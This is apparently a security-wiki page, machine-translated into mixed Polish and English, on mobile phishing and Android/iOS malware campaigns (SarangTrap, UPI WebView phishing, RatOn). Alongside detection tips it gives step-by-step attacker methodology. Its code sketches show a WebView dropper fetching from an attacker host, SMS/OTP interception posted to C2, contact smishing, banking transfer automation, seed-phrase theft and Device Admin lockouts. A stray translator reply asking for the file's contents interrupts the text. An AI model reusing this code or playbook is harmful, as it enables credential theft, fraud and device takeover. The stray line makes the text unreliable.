# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ta strona opisuje techniki używane przez aktorów zagrożeń do dystrybucji **malicious Android APKs** i **iOS mobile-configuration profiles** poprzez phishing (SEO, social engineering, fake stores, dating apps, etc.).
> Materiał jest adaptacją kampanii SarangTrap ujawnionej przez Zimperium zLabs (2025) oraz innych publicznych badań.

## Przebieg ataku

1. **SEO/Phishing Infrastructure**
* Zarejestruj dziesiątki podobnych domen (dating, cloud share, car service…).
– Użyj lokalnych słów kluczowych i emoji w elemencie `<title>`, aby poprawić pozycję w Google.
– Hostuj *zarówno* Android (`.apk`) jak i instrukcje instalacji iOS na tej samej stronie docelowej.
2. **Pobranie w pierwszym etapie**
* Android: bezpośredni link do *unsigned* lub „third-party store” APK.
* iOS: `itms-services://` lub zwykły link HTTPS do złośliwego **mobileconfig** profilu (patrz niżej).
3. **Post-install Social Engineering**
* Przy pierwszym uruchomieniu aplikacja prosi o **kod zaproszenia / weryfikacji** (iluzja ekskluzywnego dostępu).
* Kod jest **POSTed over HTTP** do Command-and-Control (C2).
* C2 odpowiada `{"success":true}` ➜ malware kontynuuje działanie.
* Analiza dynamiczna Sandbox / AV, która nigdy nie wysyła prawidłowego kodu, nie zobaczy **żadnego złośliwego zachowania** (ewazja).
4. **Runtime Permission Abuse** (Android)
* Niebezpieczne uprawnienia są żądane dopiero **po pozytywnej odpowiedzi C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Nowsze warianty **usuwają `<uses-permission>` dla SMS z `AndroidManifest.xml`** ale pozostawiają ścieżkę w Java/Kotlin, która czyta SMS przez reflection ⇒ obniża to wynik w analizie statycznej, a nadal działa na urządzeniach, które przyznały uprawnienie przez nadużycie `AppOps` lub na starszych celach.
5. Fasadowy UI i zbieranie w tle
* Aplikacja pokazuje nieszkodliwe widoki (przeglądarka SMS, wybieracz galerii) zaimplementowane lokalnie.
* W międzyczasie exfiltruje:
- IMEI / IMSI, numer telefonu
- Pełny zrzut `ContactsContract` (JSON array)
- JPEG/PNG z `/sdcard/DCIM` skompresowane za pomocą [Luban](https://github.com/Curzibn/Luban) w celu zmniejszenia rozmiaru
- Opcjonalna zawartość SMS (`content://sms`)
Dane ładunku są **batch-zipped** i wysyłane przez `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* Pojedynczy **mobile-configuration profile** może zażądać `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itd., aby zarejestrować urządzenie w nadzorze podobnym do „MDM”.
* Instrukcje social-engineeringowe:
1. Otwórz Ustawienia ➜ *Profile downloaded*.
2. Stuknij *Install* trzy razy (zrzuty ekranu na stronie phishingowej).
3. Zaufaj niepodpisanemu profilowi ➜ atakujący zyskuje uprawnienia *Contacts* & *Photo* bez przeglądu App Store.
7. Warstwa sieciowa
* Zwykły HTTP, często na porcie 80 z nagłówkiem HOST takim jak `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (brak TLS → łatwe do wykrycia).

## Porady dla testów defensywnych / Red-Team

* **Dynamic Analysis Bypass** – Podczas oceny malware zautomatyzuj fazę kodu zaproszenia przy użyciu Frida/Objection, aby dotrzeć do złośliwej gałęzi.
* **Manifest vs. Runtime Diff** – Porównaj `aapt dump permissions` z runtime `PackageManager#getRequestedPermissions()`; brakujące niebezpieczne permisy to czerwona flaga.
* **Network Canary** – Skonfiguruj `iptables -p tcp --dport 80 -j NFQUEUE` aby wykryć nietypowe nagłe wysyły POST po wpisaniu kodu.
* **mobileconfig Inspection** – Użyj `security cms -D -i profile.mobileconfig` na macOS, aby wylistować `PayloadContent` i wykryć nadmierne uprawnienia.

## Pomysły wykrywania dla Blue Team

* **Certificate Transparency / DNS Analytics** aby wychwycić nagłe pojawianie się domen bogatych w słowa kluczowe.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` z klientów Dalvik spoza Google Play.
* **Invite-code Telemetry** – POST 6–8 cyfrowych kodów numerycznych krótko po instalacji APK może wskazywać na staging.
* **MobileConfig Signing** – Blokuj niepodpisane profile konfiguracyjne za pomocą polityki MDM.

## Przydatny fragment Frida: Automatyczne ominięcie kodu zaproszenia
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Wskaźniki (Ogólne)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### Łańcuch dostaw przez zaufane platformy
- Wabik wideo na YouTube → opis zawiera krótki link
- Krótki link → strona phishingowa na GitHub Pages podszywająca się pod oryginalny portal
- To samo repo GitHub hostuje APK z fałszywą plakietką “Google Play”, linkującą bezpośrednio do pliku
- Dynamiczne strony phishingowe działają na Replit; zdalny kanał poleceń używa Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Pierwszy APK to installer (dropper), który dostarcza rzeczywiste malware pod `assets/app.apk` i prosi użytkownika o wyłączenie Wi‑Fi/danych mobilnych, aby osłabić wykrywanie w chmurze.
- The embedded payload instaluje się pod niewinną etykietą (np. “Secure Update”). Po instalacji zarówno installer, jak i payload są obecne jako oddzielne aplikacje.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dynamiczne odkrywanie endpointów przez shortlink
- Malware pobiera listę w plain-text, rozdzieloną przecinkami, aktywnych endpointów z shortlink; proste transformacje stringów tworzą końcową ścieżkę strony phishing.

Przykład (zredagowany):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudokod:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based wyłudzanie poświadczeń UPI
- Krok „Wykonaj płatność ₹1 / UPI‑Lite” ładuje złośliwy formularz HTML z dynamicznego endpointu wewnątrz WebView i przechwytuje pola wrażliwe (telefon, bank, UPI PIN), które są `POST`owane do `addup.php`.

Minimalny loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- Na pierwszym uruchomieniu żądane są agresywne uprawnienia:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakty są przetwarzane w pętli, aby masowo wysyłać smishing SMS-y z urządzenia ofiary.
- Przychodzące SMS-y są przechwytywane przez broadcast receiver i przesyłane wraz z metadanymi (sender, body, SIM slot, per-device random ID) do `/addsm.php`.

Szkic odbiornika:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) jako odporny C2
- Payload rejestruje się w FCM; push messages niosą pole `_type` używane jako przełącznik do wyzwalania akcji (np. aktualizacja szablonów tekstów phishing, przełączanie zachowań).

Przykładowy FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Szkic handlera:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Wzorce wykrywania i IOCs
- APK zawiera dodatkowy payload w `assets/app.apk`
- WebView ładuje płatność z `gate.htm` i eksfiltrowuje do `/addup.php`
- Eksfiltracja SMS-ów do `/addsm.php`
- Pobieranie konfiguracji uruchamiane przez shortlink (np. `rebrand.ly/*`) zwracające endpointy w formacie CSV
- Aplikacje oznaczone jako ogólne „Update/Secure Update”
- Wiadomości FCM `data` z polem `_type` w niezaufanych aplikacjach

### Pomysły na wykrywanie i obronę
- Oznaczaj aplikacje, które instruują użytkowników, aby wyłączyli sieć podczas instalacji, a następnie side-loadują drugi APK z `assets/`.
- Generuj alert na krotkę uprawnień: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + przepływy płatności oparte o WebView.
- Monitorowanie egressu dla `POST /addup.php|/addsm.php` na hostach niekorporacyjnych; blokuj znaną infrastrukturę.
- Reguły Mobile EDR: niezaufana aplikacja rejestrująca się do FCM i rozgałęziająca się na podstawie pola `_type`.

---

## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – studium przypadku RatOn

Kampania RatOn banker/RAT (ThreatFabric) jest konkretnym przykładem, jak współczesne operacje phishingu mobilnego łączą WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), przejęcie portfela kryptowalut i nawet orkiestrację NFC-relay. Ta sekcja wyodrębnia techniki nadające się do ponownego użycia.

### Stage-1: WebView → natywny most instalacyjny (dropper)

Atakujący prezentują WebView wskazujący na złośliwą stronę i wstrzykują interfejs JavaScript, który udostępnia natywny instalator. Stuknięcie przycisku HTML wywołuje kod natywny, który instaluje APK drugiego etapu dołączony w assets droppera, a następnie bezpośrednio go uruchamia.

Minimalny wzorzec:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Nie widzę zawartości pliku. Proszę wklej tutaj HTML/Markdown z pliku src/generic-methodologies-and-resources/phishing-methodology/mobile-phishing-malicious-apps.md, a przetłumaczę odpowiedni angielski tekst na polski, zachowując dokładnie wszystkie tagi, linki, ścieżki, kod oraz markdown/html.
```html
<button onclick="bridge.installApk()">Install</button>
```
Po instalacji dropper uruchamia payload za pomocą explicit package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: nieufne aplikacje wywołujące `addJavascriptInterface()` i udostępniające WebView metody przypominające instalator; APK zawierający osadzony secondary payload w `assets/` i wywołujący Package Installer Session API.

### Consent funnel: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 otwiera WebView, który hostuje stronę “Access”. Jej przycisk wywołuje eksportowaną metodę, która nawiguję ofiarę do ustawień Accessibility i prosi o włączenie złośliwej usługi. Po przyznaniu malware używa Accessibility, aby automatycznie przejść przez kolejne runtime permission dialogs (contacts, overlay, manage system settings, etc.) i żąda Device Admin.

- Accessibility programowo pomaga zaakceptować późniejsze monity, znajdując w drzewie węzłów przyciski takie jak “Allow”/“OK” i wysyłając kliknięcia.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Zobacz także:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Operatorzy mogą wydawać polecenia, aby:
- wyświetlić nakładkę na cały ekran z URL, lub
- przekazać inline HTML, które zostanie załadowane do nakładki WebView.

Prawdopodobne zastosowania: coercion (wprowadzenie PIN), otwieranie wallet w celu przechwycenia PIN-ów, wiadomości z żądaniem okupu. Zachowaj polecenie, które sprawdzi i wymusi nadanie uprawnienia do nakładek, jeśli go brakuje.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: okresowo zrzucać drzewo węzłów Accessibility, serializować widoczne teksty/role/bounds i wysyłać do C2 jako pseudo-ekran (polecenia takie jak `txt_screen` jednorazowo i `screen_live` ciągłe).
- High-fidelity: zażądać MediaProjection i rozpocząć strumieniowanie/nagrywanie ekranu na żądanie (polecenia takie jak `display` / `record`).

### ATS playbook (bank app automation)
Mając zadanie w formacie JSON, otwórz aplikację bankową, steruj UI przez Accessibility używając mieszanki zapytań tekstowych i stuknięć po współrzędnych, oraz wprowadź payment PIN ofiary, gdy zostanie poproszony.

Przykładowe zadanie:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "Nowa płatność"
- "Zadat platbu" → "Wprowadź płatność"
- "Nový příjemce" → "Nowy odbiorca"
- "Domácí číslo účtu" → "Krajowy numer konta"
- "Další" → "Dalej"
- "Odeslat" → "Wyślij"
- "Ano, pokračovat" → "Tak, kontynuuj"
- "Zaplatit" → "Zapłać"
- "Hotovo" → "Gotowe"

Operatorzy mogą również sprawdzać/podwyższać limity przelewów za pomocą komend takich jak `check_limit` i `limit`, które w podobny sposób nawigują po limits UI.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.

### Device Admin coercion
Device Admin APIs są używane do zwiększenia możliwości przechwytywania PIN oraz zniechęcenia ofiary:

- Natychmiastowa blokada:
```java
dpm.lockNow();
```
- Wygaszenie bieżącego poświadczenia w celu wymuszenia zmiany (Accessibility przechwytuje nowy PIN/hasło):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Wymuś odblokowanie bez biometrii, wyłączając funkcje biometryczne keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Uwaga: Wiele kontroli DevicePolicyManager wymaga Device Owner/Profile Owner na nowszych Android; niektóre buildy OEM mogą być luźne. Zawsze weryfikuj na docelowym OS/OEM.

### NFC relay orchestration (NFSkate)
Stage-3 może zainstalować i uruchomić zewnętrzny moduł NFC-relay (np. NFSkate) i nawet przekazać mu szablon HTML, który poprowadzi ofiarę podczas relay. To umożliwia bezstykowe card-present cash-out obok online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/stan: `txt_screen`, `screen_live`, `display`, `record`
- Społeczne: `send_push`, `Facebook`, `WhatsApp`
- Nakładki: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Portfele: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Urządzenie: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Komunikacja/rozpoznanie: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Detection & defence ideas (RatOn-style)
- Szukaj WebViewów z `addJavascriptInterface()` ujawniającymi metody instalatora/uprawnień; strony kończące się na “/access”, które wywołują monity Accessibility.
- Generuj alerty dla aplikacji, które generują dużą liczbę gestów/kliknięć Accessibility krótko po przyznaniu dostępu do usługi; telemetria przypominająca zrzuty węzłów Accessibility wysyłana do C2.
- Monitoruj zmiany polityki Device Admin w niezastrzeżonych aplikacjach: `lockNow`, wygasanie haseł, przełączniki funkcji keyguard.
- Alarmuj przy monitach MediaProjection z aplikacji niekorporacyjnych, po których następują okresowe przesyły ramek.
- Wykrywaj instalację/uruchomienie zewnętrznej aplikacji NFC-relay wywołanej przez inną aplikację.
- Dla bankowości: egzekwuj potwierdzenia poza kanałem, powiązanie z biometrią oraz limity transakcji odporne na automatyzację na urządzeniu.

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)

{{#include ../../banners/hacktricks-training.md}}
